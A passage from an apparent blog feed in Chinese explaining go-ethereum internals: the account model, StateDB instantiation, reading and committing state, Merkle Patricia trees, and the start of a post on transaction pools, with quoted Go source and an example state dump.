core/state_transition.go:212</span></span><br><span class="line">st.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>Balance 则记录该账户所拥有的以太（ETH）数量，称为账户余额.</li></ul><p>当然必须保证转账方余额充足，在转移前需要 CanTransfer 检查， 如果余额充足，则执行 Transfer 转移 Value 数量的以太。</p><ul><li>账户状态哈希值 StateRoot，是一颗默克尔压缩前缀树（Merkle Patricia Tree）的根值。可以直接利用 StateRoot 从 Leveldb 中快速读取具体的某个状态数据</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E8%B4%A6%E6%88%B7%E6%A8%A1%E5%9E%8B-1.png#clientId=u7a530312-f976-4&from=paste&height=318&id=uadb7d967&margin=%5Bobject%20Object%5D&originHeight=1006&originWidth=1062&originalType=url&status=done&style=none&taskId=u8125fdd8-2c02-4142-8ff6-2a5b708f249&width=336"><br>上图是以太坊账户数据存储结构，账户内部实际只存储关键数据，而合约代码以及合约自身数据则通过对应的哈希值关联。 因为每个账户对象，将作为一个以太坊账户树的一个叶子数据存储， 不能太大。<br>从以太坊作为一个世界态(World State)状态机视角看数据关系如下：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E8%B4%A6%E6%88%B7%E6%A8%A1%E5%9E%8B-2.png#clientId=u7a530312-f976-4&from=paste&height=125&id=ud8337454&margin=%5Bobject%20Object%5D&originHeight=174&originWidth=955&originalType=url&status=done&style=none&taskId=u96e7177e-6233-4ade-8cc1-94578d56711&width=686.5"><br>我们通过一段示例代码，感受下以太坊账户数据存储。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>(...)</span><br><span class="line"><span class="keyword">var</span> toAddr =common.HexToAddress</span><br><span class="line"><span class="keyword">var</span> toHash =common.BytesToHash</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    statadb, _ := state.New(common.Hash&#123;&#125;,</span><br><span class="line">        state.NewDatabase(rawdb.NewMemoryDatabase()))<span class="comment">// ❶</span></span><br><span class="line"></span><br><span class="line">    acct1:=toAddr(<span class="string">&quot;0x0bB141C2F7d4d12B1D27E62F86254e6ccEd5FF9a&quot;</span>)<span class="comment">// ❷</span></span><br><span class="line">    acct2:=toAddr(<span class="string">&quot;0x77de172A492C40217e48Ebb7EEFf9b2d7dF8151B&quot;</span>)</span><br><span class="line"></span><br><span class="line">    statadb.AddBalance(acct1,big.NewInt(<span class="number">100</span>))</span><br><span class="line">    statadb.AddBalance(acct2,big.NewInt(<span class="number">888</span>))</span><br><span class="line"></span><br><span class="line">    contract:=crypto.CreateAddress(acct1,statadb.GetNonce(acct1))<span class="comment">// ❸</span></span><br><span class="line">    statadb.CreateAccount(contract)</span><br><span class="line">    statadb.SetCode(contract,[]<span class="keyword">byte</span>(<span class="string">&quot;contract code bytes&quot;</span>))<span class="comment">// ❹</span></span><br><span class="line"></span><br><span class="line">    statadb.SetNonce(contract,<span class="number">1</span>)</span><br><span class="line">    statadb.SetState(contract,toHash([]<span class="keyword">byte</span>(<span class="string">&quot;owner&quot;</span>)),toHash(acct1.Bytes()))<span class="comment">//❺</span></span><br><span class="line">    statadb.SetState(contract,toHash([]<span class="keyword">byte</span>(<span class="string">&quot;name&quot;</span>)),toHash([]<span class="keyword">byte</span>(<span class="string">&quot;ysqi&quot;</span>)))</span><br><span class="line"></span><br><span class="line">    statadb.SetState(contract,toHash([]<span class="keyword">byte</span>(<span class="string">&quot;online&quot;</span>)),toHash([]<span class="keyword">byte</span>&#123;<span class="number">1</span>&#125;)</span><br><span class="line">    statadb.SetState(contract,toHash([]<span class="keyword">byte</span>(<span class="string">&quot;online&quot;</span>)),toHash([]<span class="keyword">byte</span>&#123;&#125;))<span class="comment">//❻</span></span><br><span class="line"></span><br><span class="line">    statadb.Commit(<span class="literal">true</span>)<span class="comment">// ❼</span></span><br><span class="line">    fmt.Println(<span class="keyword">string</span>(statadb.Dump()))<span class="comment">// ❽</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，我们创建了三个账户，并且提交到数据库中。最终打印出当前数据中所有账户的数据信息：</p><ul><li>❶ 一行代码涉及多个操作。首先是<strong>创建一个内存 KV 数据库</strong>，再<strong>包装为 stata 数据库实例</strong>， 最后<strong>利用一个空的 DB 级的 StateRoot，初始化一个以太坊 statadb</strong>。</li><li>❷ 定义两个账户 acct1 和 acct2，并分别添加 100 和 888 到账户余额。</li><li>❸ 模拟合约账户的创建过程，由外部账户 acct1 创建合约账户地址，并将此地址载入 statadb。</li><li>❹ 在将合约代码加入刚刚创建的合约账户中，在写入合约代码的同时， 会利用 crypto.Keccak256Hash(code)计算合约代码哈希，保留在账户数据中。</li><li>❺ 模拟合约执行过程，涉及修改合约状态，新增三项状态数据 owner,name 和 online，分别对应不同值。</li><li>❻ 这里和前面不同的是，是给状态 online 赋值为空[]byte{}，因为所有状态的默认值均是[]byte{}， 在提交到数据库时，如 Leveldb 认为这些状态无有效值，会从数据库文件中删除此记录。 因此，此操作实际是一个删除状态 online 操作。</li><li>❼ 上面所有操作，还都<strong>只是发生在 statdb 内存</strong>中，并未真正的写入数据库文件。 <strong>执行 Commit</strong>，才会<strong>将关于 statadb 的所有变更更新到数据库文件</strong>中。</li><li>❽ 一旦提交数据，则可以使用 Dump 命令从数据库中查找此 stata 相关的所有数据，包括所有账户。 并<strong>以 JSON 格式返还</strong>。这里，我们将返还结果直接打印输出。</li></ul><p>代码执行输出结果如下：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;root&quot;</span>: <span class="string">&quot;3a25b0816cf007c0b878ca7a62ba35ee0337fa53703f281c41a791a137519f00&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;accounts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;0bb141c2f7d4d12b1d27e62f86254e6cced5ff9a&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;balance&quot;</span>: <span class="string">&quot;100&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;nonce&quot;</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">&quot;root&quot;</span>: <span class="string">&quot;56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;codeHash&quot;</span>: <span class="string">&quot;c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;code&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;storage&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;77de172a492c40217e48ebb7eeff9b2d7df8151b&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;balance&quot;</span>: <span class="string">&quot;888&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;nonce&quot;</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">&quot;root&quot;</span>: <span class="string">&quot;56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;codeHash&quot;</span>: <span class="string">&quot;c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;code&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;storage&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;80580f576731dc1e1dcc53d80b261e228c447cdd&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;balance&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;nonce&quot;</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">&quot;root&quot;</span>: <span class="string">&quot;1f6d937817f2ac217d8b123c4983c45141e50bd0c358c07f3c19c7b526dd4267&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;codeHash&quot;</span>: <span class="string">&quot;c668dac8131a99c411450ba912234439ace20d1cc1084f8e198fee0a334bc592&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;code&quot;</span>: <span class="string">&quot;636f6e747261637420636f6465206279746573&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;storage&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;000000000000000000000000000000000000000000000000000000006e616d65&quot;</span>: <span class="string">&quot;8479737169&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;0000000000000000000000000000000000000000000000000000006f776e6572&quot;</span>: <span class="string">&quot;940bb141c2f7d4d12b1d27e62f86254e6cced5ff9a&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;我们采用和以太坊相似的账户模型。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>区块链底层-存储</title>
    <link href="https://www.blog.hackerjerry.top/2021/04/16/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%AD%98%E5%82%A8_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/04/16/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%AD%98%E5%82%A8_new/</id>
    <published>2021-04-16T12:20:09.000Z</published>
    <updated>2021-06-21T06:38:07.338Z</updated>
    
    <content type="html"><![CDATA[<p>本文聚焦区块链底层技术–存储技术。主要包含世界状态、账户状态和 MPT 树。<br>参考：<a href="https://learnblockchain.cn/books/geth/part3/statedb.html">https://learnblockchain.cn/books/geth/part3/statedb.html</a></p><a id="more"></a><h1 id="StateDB-世界状态"><a href="#StateDB-世界状态" class="headerlink" title="StateDB-世界状态"></a>StateDB-世界状态</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%AD%98%E5%82%A8-1.png#clientId=u34e3a6f1-8d42-4&from=paste&height=136&id=u29593524&margin=%5Bobject%20Object%5D&originHeight=174&originWidth=955&originalType=url&status=done&style=none&taskId=ud67f5524-9e0a-474e-8ebf-a18abeb618d&width=747.5"><br>从程序设计角度，StateDB 有多种用途：</p><ol><li>维护账户状态到世界状态的映射。</li><li>支持修改、回滚、提交状态。</li><li>支持持久化状态到数据库中。</li><li>是状态进出默克尔树的媒介。</li></ol><p>实际上** StateDB <strong>充当</strong>状态（数据）<strong>、</strong>Trie(树)<strong>、</strong>LevelDB（存储）**的协调者。</p><h2 id="实例化-StateDB"><a href="#实例化-StateDB" class="headerlink" title="实例化 StateDB"></a>实例化 StateDB</h2><p>在对状态的任何操作前，我们要先构建一个 StateDB 来操作状态。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db: = state.NewDatabase(levelDB)</span><br><span class="line">statedb, err := state.New(block.Root(), db)</span><br></pre></td></tr></table></figure><p>首先，我们要告诉 StateDB ，我们要使用哪个状态。因此<strong>需要提供 StateRoot 作为默克尔树根去构建树</strong>。StateRoot 值相当于数据版本号，根据版本号可以明确的知道要使用使用哪个版本的状态。当然，数据内容并没在树中，<strong>需要到一个数据库中读取</strong>。因此在构建 State DB 时需要提供 stateRoot 和 db 才能完成构建。<br>任何实现 state.Database 接口的 db 都可以使用</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// core/state/database.go:42</span></span><br><span class="line"><span class="keyword">type</span> Database <span class="keyword">interface</span> &#123;</span><br><span class="line">OpenTrie(root common.Hash) (Trie, error)</span><br><span class="line">OpenStorageTrie(addrHash, root common.Hash) (Trie, error)</span><br><span class="line">CopyTrie(Trie) Trie</span><br><span class="line">ContractCode(addrHash, codeHash common.Hash) ([]<span class="keyword">byte</span>, error)</span><br><span class="line">ContractCodeSize(addrHash, codeHash common.Hash) (<span class="keyword">int</span>, error)</span><br><span class="line"></span><br><span class="line"><span class="comment">// TrieDB retrieves the low level trie database used for data storage.</span></span><br><span class="line">TrieDB() *trie.Database</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 db 可以访问：</p><ol><li>OpenTrie: 打开指定状态版本(root)的含世界状态的顶层树。</li><li>OpenStorageTrie: <strong>打开账户(addrHash)下</strong>指定状态版本(root)的<strong>账户数据存储树</strong>。</li><li>CopyTrie: 深度拷贝树。</li><li>ContractCode：获取账户（addrHash）的合约，必须和合约哈希(codeHash)匹配。</li><li>ContractCodeSize 获取指定合约大小</li><li>TrieDB：<strong>获得 Trie 底层的数据驱动 DB</strong>，如:** levedDB** 、<strong>内存数据库</strong>、远程数据库</li></ol><p>当前有两种类型的 DB 实现了 Database 接口，轻节点使用的 odrDatabase ，和正常节点端使用的带有缓存的 cachingDB 。 因为轻节点并不存储数据，需要通过向其他节点查询来获得数据，而 odrDatabase 就是这种数据读取方式的封装。一个普通节点已内置 levelDB，为了提高读写性能，使用 cachingDB 对其进行一次封装。<br>在实例化 StateDB 时，需要立即打开含有世界状态的 Trie 树。如果 root 对应的树不存在，则会实例化失败 ①。实例化的 StateDB 中将记录多种信息。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/state/statedb.go:59</span></span><br><span class="line"><span class="keyword">type</span> StateDB <span class="keyword">struct</span> &#123;</span><br><span class="line">db   Database</span><br><span class="line">trie Trie</span><br><span class="line">stateObjects      <span class="keyword">map</span>[common.Address]*stateObject</span><br><span class="line">stateObjectsDirty <span class="keyword">map</span>[common.Address]<span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">dbErr error</span><br><span class="line">refund <span class="keyword">uint64</span></span><br><span class="line"></span><br><span class="line">thash, bhash common.Hash</span><br><span class="line">txIndex      <span class="keyword">int</span></span><br><span class="line">logs         <span class="keyword">map</span>[common.Hash][]*types.Log</span><br><span class="line">logSize      <span class="keyword">uint</span></span><br><span class="line"></span><br><span class="line">preimages <span class="keyword">map</span>[common.Hash][]<span class="keyword">byte</span></span><br><span class="line">journal        *journal</span><br><span class="line">validRevisions []revision</span><br><span class="line">nextRevisionId <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>db: 操作状态的<strong>底层数据库</strong>，在实例化 StateDB 时指定 ②。</li><li>trie: 世界状态所在的树实例对象，现在只有以太坊改进的默克尔前缀压缩树。</li><li>stateObjects: <strong>已账户地址为键的账户状态对象，能够在内存中维护使用过的账户</strong>。</li><li>stateObjectsDirty： 标记被修改过的账户。</li><li>journal： 是修改状态的日志流水，使用此日志流水可回滚状态。</li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/state/statedb.go:92</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(root common.Hash, db Database)</span> <span class="params">(*StateDB, error)</span></span> &#123;</span><br><span class="line">tr, err := db.OpenTrie(root)<span class="comment">//①</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;StateDB&#123;</span><br><span class="line">db:                db,<span class="comment">//②</span></span><br><span class="line">trie:              tr,</span><br><span class="line">stateObjects:      <span class="built_in">make</span>(<span class="keyword">map</span>[common.Address]*stateObject),</span><br><span class="line">stateObjectsDirty: <span class="built_in">make</span>(<span class="keyword">map</span>[common.Address]<span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">logs:              <span class="built_in">make</span>(<span class="keyword">map</span>[common.Hash][]*types.Log),</span><br><span class="line">preimages:         <span class="built_in">make</span>(<span class="keyword">map</span>[common.Hash][]<span class="keyword">byte</span>),</span><br><span class="line">journal:           newJournal(),</span><br><span class="line">&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面对的代码实例化了一个 statedb。</p><h2 id="读写-StateDB-状态"><a href="#读写-StateDB-状态" class="headerlink" title="读写 StateDB 状态"></a>读写 StateDB 状态</h2><p>你所访问的任何数据必然属于某个账户下的状态，世界状态态仅仅是通过一颗树来建立安全的映射。因此你所访问的数据可以分为如下几种类型：</p><ol><li>访问账户基础属性：Balance、Nonce、Root、CodeHash</li><li>读取合约账户代码</li><li>读取合约账户中存储内容</li></ol><p>在代码实现中，为了便于账户隔离管理，使用不开放的 stateObject 来维护。 stateObject 注意代码如下：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> stateObject <span class="keyword">struct</span> &#123;</span><br><span class="line">address  common.Address<span class="comment">//对应的账户地址</span></span><br><span class="line">addrHash common.Hash <span class="comment">// 账户地址的哈希值</span></span><br><span class="line">data     Account <span class="comment">//账户属性</span></span><br><span class="line">db       *StateDB <span class="comment">//底层数据库</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="comment">// 写缓存</span></span><br><span class="line">trie Trie <span class="comment">// 存储树，第一次访问时初始化</span></span><br><span class="line">code Code <span class="comment">// contract bytecode, which gets set when code is loaded</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Account <span class="keyword">struct</span> &#123;</span><br><span class="line">Nonce    <span class="keyword">uint64</span></span><br><span class="line">Balance  *big.Int</span><br><span class="line">Root     common.Hash <span class="comment">// merkle root of the storage trie</span></span><br><span class="line">CodeHash []<span class="keyword">byte</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 stateObject 中维护关于某个账户的所有信息，涉及账户地址、账户地址哈希、账户属性、底层数据库、存储树等内容。<br>当你访问状态时，需要指定账户地址。比如获取账户合约，合约账户代码，均是通过账户地址，获得获得对应的账户的 stateObject。因此，当你访问某账户余额时，需要从世界状态树 Trie 中读取账户状态。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// core/state/statedb.go:408</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(self *StateDB)</span> <span class="title">getStateObject</span><span class="params">(addr common.Address)</span> <span class="params">(stateObject *stateObject)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> obj := self.stateObjects[addr]; obj != <span class="literal">nil</span> &#123;<span class="comment">//①</span></span><br><span class="line"><span class="keyword">if</span> obj.deleted &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enc, err := self.trie.TryGet(addr[:])<span class="comment">//②</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(enc) == <span class="number">0</span> &#123;</span><br><span class="line">self.setError(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> data Account</span><br><span class="line"><span class="keyword">if</span> err := rlp.DecodeBytes(enc, &amp;data); err != <span class="literal">nil</span> &#123;<span class="comment">//③</span></span><br><span class="line">log.Error(<span class="string">&quot;Failed to decode state object&quot;</span>, <span class="string">&quot;addr&quot;</span>, addr, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">obj := newObject(self, addr, data)<span class="comment">//④</span></span><br><span class="line">self.setStateObject(obj)</span><br><span class="line"><span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>state.getStateObject(addr)方法，将返回指定账户的 StateObject，不存在时 nil。<br>state 的 stateObject Map 中记录这从实例化 State 到当下，所有访问过的账户的 StateObject。 因此，获取 StateObject 时先从 map 缓存中检查是否已打开 ①，如果存在则返回。** 如果是第一次使用，则以账户地址为 key 从树中查找读取账户状态数据<strong>②。读取到的数据，是被 RLP 序列化过的，因此，在读取到数据后，还需要进行反序列化 ③。为了降低 IO 和在内存中维护可能被修改的 Account 信息，会将其组装成 **StateObjec ④ 存储在 State 实例</strong>中。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/state/state_object.go:108</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newObject</span><span class="params">(db *StateDB, address common.Address, data Account)</span> *<span class="title">stateObject</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> data.Balance == <span class="literal">nil</span> &#123;</span><br><span class="line">data.Balance = <span class="built_in">new</span>(big.Int)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> data.CodeHash == <span class="literal">nil</span> &#123;</span><br><span class="line">data.CodeHash = emptyCodeHash</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;stateObject&#123;</span><br><span class="line">db:            db,</span><br><span class="line">address:       address,</span><br><span class="line">addrHash:      crypto.Keccak256Hash(address[:]),<span class="comment">//⑤</span></span><br><span class="line">data:          data,</span><br><span class="line">originStorage: <span class="built_in">make</span>(Storage),</span><br><span class="line">dirtyStorage:  <span class="built_in">make</span>(Storage),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newObject 就是将对 Account 的操作进行辅助，其中记录了账户地址、地址哈希 ⑤ 等内容，最终你读写状态都经过 stateObject 完成。</p><h2 id="StateDB-完成持久化"><a href="#StateDB-完成持久化" class="headerlink" title="StateDB 完成持久化"></a>StateDB 完成持久化</h2><p>在区块中，将交易作为输入条件，来根据一系列动作修改状态。<br>在完成区块挖矿前，只是获得在内存中的状态树的 Root 值。 StateDB 可视为一个内存数据库，状态数据先在内存数据库中完成修改，所有关于状态的计算都在内存中完成。 在将区块持久化时完成有内存到数据库的更新存储，此更新属于增量更新，仅仅修改涉及到被修改部分。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// core/state/statedb.go:680</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *StateDB)</span> <span class="title">Commit</span><span class="params">(deleteEmptyObjects <span class="keyword">bool</span>)</span> <span class="params">(root common.Hash, err error)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> s.clearJournalAndRefund()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr := <span class="keyword">range</span> s.journal.dirties &#123;<span class="comment">//①⑧⑨⑩</span></span><br><span class="line">s.stateObjectsDirty[addr] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> addr, stateObject := <span class="keyword">range</span> s.stateObjects &#123;<span class="comment">//②</span></span><br><span class="line">_, isDirty := s.stateObjectsDirty[addr]</span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line"><span class="keyword">case</span> stateObject.suicided || (isDirty &amp;&amp; deleteEmptyObjects &amp;&amp; stateObject.empty()):</span><br><span class="line"><span class="comment">//③</span></span><br><span class="line">s.deleteStateObject(stateObject)</span><br><span class="line"><span class="keyword">case</span> isDirty:</span><br><span class="line"><span class="keyword">if</span> stateObject.code != <span class="literal">nil</span> &amp;&amp; stateObject.dirtyCode &#123;<span class="comment">//④</span></span><br><span class="line">s.db.TrieDB().InsertBlob(common.BytesToHash(stateObject.CodeHash()), stateObject.code)</span><br><span class="line">stateObject.dirtyCode = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := stateObject.CommitTrie(s.db); err != <span class="literal">nil</span> &#123;<span class="comment">//⑤</span></span><br><span class="line"><span class="keyword">return</span> common.Hash&#123;&#125;, err</span><br><span class="line">&#125;</span><br><span class="line">s.updateStateObject(stateObject)<span class="comment">//⑥</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">delete</span>(s.stateObjectsDirty, addr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">root, err = s.trie.Commit(<span class="function"><span class="keyword">func</span><span class="params">(leaf []<span class="keyword">byte</span>, parent common.Hash)</span> <span class="title">error</span></span> &#123;<span class="comment">//⑦</span></span><br><span class="line"><span class="keyword">var</span> account Account</span><br><span class="line"><span class="keyword">if</span> err := rlp.DecodeBytes(leaf, &amp;account); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> account.Root != emptyRoot &#123;</span><br><span class="line">s.db.TrieDB().Reference(account.Root, parent)</span><br><span class="line">&#125;</span><br><span class="line">code := common.BytesToHash(account.CodeHash)</span><br><span class="line"><span class="keyword">if</span> code != emptyCode &#123;</span><br><span class="line">s.db.TrieDB().Reference(code, parent)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span> root, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%AD%98%E5%82%A8-2.png#clientId=u34e3a6f1-8d42-4&from=paste&height=506&id=ufcde743f&margin=%5Bobject%20Object%5D&originHeight=1012&originWidth=936&originalType=url&status=done&style=none&taskId=u9036f292-bba3-41a2-a09a-3566a7f7e94&width=468"><br>如上图所示，上半部分均属于内存操作，仅仅在 stateDB.Commit()时才将状态通过树提交到 leveldb 中。</p><h1 id="MPT-默克尔压缩前缀树"><a href="#MPT-默克尔压缩前缀树" class="headerlink" title="MPT-默克尔压缩前缀树"></a>MPT-默克尔压缩前缀树</h1><p>是一种经过改良的、融合了默克尔树和前缀树两种树结构优点的数据结构，是以太坊中用来组织管理账户数据、生成交易集合哈希的重要数据结构。一个非叶节点存储在 leveldb 关系型数据库中，数据库中的 key 是节点的 RLP 编码的 sha3 哈希，value 是节点的 RLP 编码。想要获得一个非叶节点的子节点，只需要根据子节点的 hash 访问数据库获得节点的 RLP 编码，然后解码就行了。<br>以太坊有四种前缀树：</p><ol><li><strong>世界状态树包括了从地址到账户状态之间的映射。</strong> 世界状态树的根节点哈希值由区块保存（在 stateRoot 字段），它标示了区块创建时的当前状态。<strong>整个网络中只有一个世界状态树。</strong></li><li><strong>账户存储树保存了与某一智能合约相关的数据信息。</strong>由账户状态保存账户存储树的根节点哈希值（在 storageRoot 字段）。<strong>每个账户都有一个账户存储树。</strong></li><li><strong>交易树包含了一个区块中的所有交易信息。</strong>由区块头（在 transactionsRoot 区域）保存交易树的根节点哈希值。<strong>每个区块都有一棵交易树。</strong></li><li><strong>交易收据树包含了一个区块中所有交易的收据信息。</strong>同样由区块头（在 receiptsRoot 区域）保存交易收据树的根节点哈希值；<strong>每个区块都有对应的交易收据树。</strong></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文聚焦区块链底层技术–存储技术。主要包含世界状态、账户状态和 MPT 树。&lt;br&gt;参考：&lt;a href=&quot;https://learnblockchain.cn/books/geth/part3/statedb.html&quot;&gt;https://learnblockchain.cn/books/geth/part3/statedb.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>交易内存池底层实现</title>
    <link href="https://www.blog.hackerjerry.top/2021/04/15/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/04/15/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0_new/</id>
    <published>2021-04-15T12:29:00.000Z</published>
    <updated>2021-06-21T06:40:33.443Z</updated>
    
    <content type="html"><![CDATA[<p>既然要从头搭建一个区块链网络，交易池是绕不开的一个核心底层。对于它，以下几个问题是需要解决的：</p><ol><li>用户发起的交易请求（不论以何种方式）是如何转变为实际的交易的；</li><li>产生的交易如果不能被及时处理，是如何进入交易池的；</li><li>本地产生的交易和从网络中接收到的交易进入交易池是否有区别；</li><li>交易池的基本数据结构是怎么样的（优先队列？）</li><li>从交易池中提取交易进行打包时顺序是怎么样的（调度算法）<blockquote><p>网络中很多文章提到内存池，指的就是是 txpool</p></blockquote></li></ol><a id="more"></a><h1 id="交易形成"><a href="#交易形成" class="headerlink" title="交易形成"></a>交易形成</h1><p>以下均为作品赛项目的内容。<br>首先，我们的交易请求会赋值到 TxRaw 结构体的一个实例中。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用于接收客户端发来的序列化post原始信息</span></span><br><span class="line"><span class="keyword">type</span> TxRaw <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">//公钥hash</span></span><br><span class="line">Address []<span class="keyword">byte</span> <span class="string">`json:&quot;address&quot;`</span></span><br><span class="line"></span><br><span class="line">Fee <span class="keyword">int</span> <span class="string">`json:&quot;int&quot;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//交易核心</span></span><br><span class="line">RangeBloom bloom.RangeBloom <span class="string">`json:&quot;rbloom&quot;`</span></span><br><span class="line">TimeBloom  bloom.TimeBloom  <span class="string">`json:&quot;tbloom&quot;`</span></span><br><span class="line"></span><br><span 